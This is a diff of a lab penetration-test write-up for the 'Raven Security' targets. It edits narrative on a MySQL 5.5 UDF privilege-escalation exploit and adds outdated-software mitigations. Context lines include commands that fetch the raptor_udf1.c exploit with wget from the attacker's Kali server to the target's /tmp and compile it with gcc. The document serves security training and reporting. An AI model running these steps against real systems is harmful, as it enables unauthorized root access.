@@ -185,7 +185,7 @@ And found the location of Flag 3. Had to return to the web browser to read it ou
 
 ![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_flag3_CLEAN.jpg "Flag 3")
 
-Found 3 of the 4 target flags. Having found no sign of the 4th flag, the focus now turned to privilege escalation. Searched & discovered that the Target is running MySQL version 5.5. At the time of this report, the lastest version of MySQL is 8.0. Performed a little searching & discovered a UDF (User Defined Function) Privilege Escalation exploit that works on mySQL 5.5 if it is running as the Root user. Checked the config file.
+Found 3 of the 4 target flags. Having found no sign of the 4th flag, the focus now turned to privilege escalation. Searched & discovered that the Target is running MySQL version 5.5. At the time of this report, the latest version of MySQL is 8.0. Performed a little searching & discovered a UDF (User Defined Function) Privilege Escalation exploit that works on mySQL 5.5 if it is running as the Root user. Checked the config file.
 
 ```
 ps aux | root
@@ -194,9 +194,9 @@ dpkg -l | grep mysql
 
 ![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_mysql%20credentials_CLEAN.JPG "MySQL Credentials")
 
-Root again. For this UDF Privilege Escalation exploit to work, a command must be written in c code. The code is then compiled into a shared object which is similar to a library file. This si then read into the Database as raw binary. Because the MySQL service is running as Root, the data can be dumped into the correct directory for MySQL to use that command as an actual library. We can then create a function that uses that shared library & allows the attacking team to exploit it.
+Root again. For this UDF Privilege Escalation exploit to work, a command must be written in c code. The code is then compiled into a shared object which is similar to a library file. This is then read into the Database as raw binary. Because the MySQL service is running as Root, the data can be dumped into the correct directory for MySQL to use that command as an actual library. We can then create a function that uses that shared library & allows the attacking team to exploit it.
 
-Lets attempt it
+Let's attempt it
 
 Pulled file 1518.c from the Exploit DB & renamed to `raptor_udf1.c`. Spun up a web server on the Kali machine & downloaded to the `/tmp` dir on target 2. 
 
@@ -208,9 +208,7 @@ Target 2
 wget http://192.168.1.90/raptor_udf1.c
 ```
 
-Now to compile. Since Target 2 is running a Debian/GNU OS & the attacking machine is a Kali Linux machine, the exploit cannot be compiled on the attacking machine if it is to work on the Target. In order for this to work, the exploit must be compiled, then loaded into the MySQL database as a root user. 
-
-Now to compile the code.
+Now to compile. Since Target 2 is running a Debian/GNU OS & the attacking machine is a Kali Linux machine, the exploit must be compiled in the same OS as it will be deployed on.
 
 ```
 gcc -g -c raptor_udf1.c
@@ -296,11 +294,12 @@ Mitigation
 * If more than 20 failed login attempts from the same IP address occur sitewide within 10 minutes, blacklist that IP until it can be reviewed.
 
 ### Outdated Software Version ###
-The team discovered an older version of Wordpress on Target 1 with many known vulnerabilities. The team also discovered an exploitable version of PHPMailer on Target 2.
+The team discovered an older version of Wordpress on Target 1 with many known vulnerabilities. The team also discovered an exploitable version of PHPMailer on Target 2. The team also exploited an outdated version of MySQL on Target 2 to gain a privileged shell.
 
 Mitigation
 * Update Wordpress to the latest version (as of the time of this report, that is version 5.7.1).
 * Update PHPMailer to the latest version (as of the time of this report, that is version 6.3.0).
+* Update MySQL to the latest version (as of the time of this report, that is version 8.0).
 
 ### Unsalted Hashed Passwords ###
 The team obtained a password hash during the engagement. An open source tool was able to quickly break the hash and allowed the team to gain login credentials for a privileged account on Target 1. Target 2's password hashes were salted.
@@ -334,4 +333,4 @@ Mitigation
 
 ## Conclusion ##
 
-Target 1 had many substantial vulnerabilities. The quickest methods to increase the security of Target 1 is to update to the latest version of Wordpress, close extra ports, and apply account lockouts. Target 2 was better protected but still allowed a backdoor and an easily guessed root user password. Change the password on the root account and update Wordpress to the latest version. Also, on both Target 1 & 2, create & use a non-privileged account for the MySQL database.
+Target 1 had many substantial vulnerabilities. The quickest methods to increase the security of Target 1 is to update to the latest version of Wordpress, close extra ports, and apply account lockouts. Target 2 was better protected but still allowed a backdoor, an easily guessed root user password, and an outdated version of software that was exploitable. Change the password on the root account, and update Wordpress and MySQL to the latest version. Also, on both Target 1 & 2, create & use a non-privileged account for the MySQL database.
